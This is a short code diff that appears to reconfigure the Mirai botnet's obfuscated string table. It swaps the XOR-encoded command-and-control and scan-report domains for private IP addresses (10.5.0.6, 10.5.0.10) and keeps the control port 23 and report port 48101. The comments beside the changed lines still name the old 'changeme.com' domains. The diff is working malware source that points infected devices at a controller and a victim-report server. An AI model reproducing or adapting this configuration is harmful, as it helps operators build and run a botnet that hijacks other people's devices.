@@ -15,10 +15,13 @@ struct table_value table[TABLE_MAX_KEYS];
 
 void table_init(void)
 {
-    add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 30); // cnc.changeme.com
+    //  10.5.0.6
+    add_entry(TABLE_CNC_DOMAIN, "\x13\x12\x0C\x17\x0C\x12\x0C\x14\x22", 9); // cnc.changeme.com
     add_entry(TABLE_CNC_PORT, "\x22\x35", 2);   // 23
-
-    add_entry(TABLE_SCAN_CB_DOMAIN, "\x50\x47\x52\x4D\x50\x56\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 29); // report.changeme.com
+    
+    
+    //  10.5.0.10
+    add_entry(TABLE_SCAN_CB_DOMAIN, "\x13\x12\x0C\x17\x0C\x12\x0C\x13\x12\x22", 10); // report.changeme.com
     add_entry(TABLE_SCAN_CB_PORT, "\x99\xC7", 2);         // 48101
 
     add_entry(TABLE_EXEC_SUCCESS, "\x4E\x4B\x51\x56\x47\x4C\x4B\x4C\x45\x02\x56\x57\x4C\x12\x22", 15);
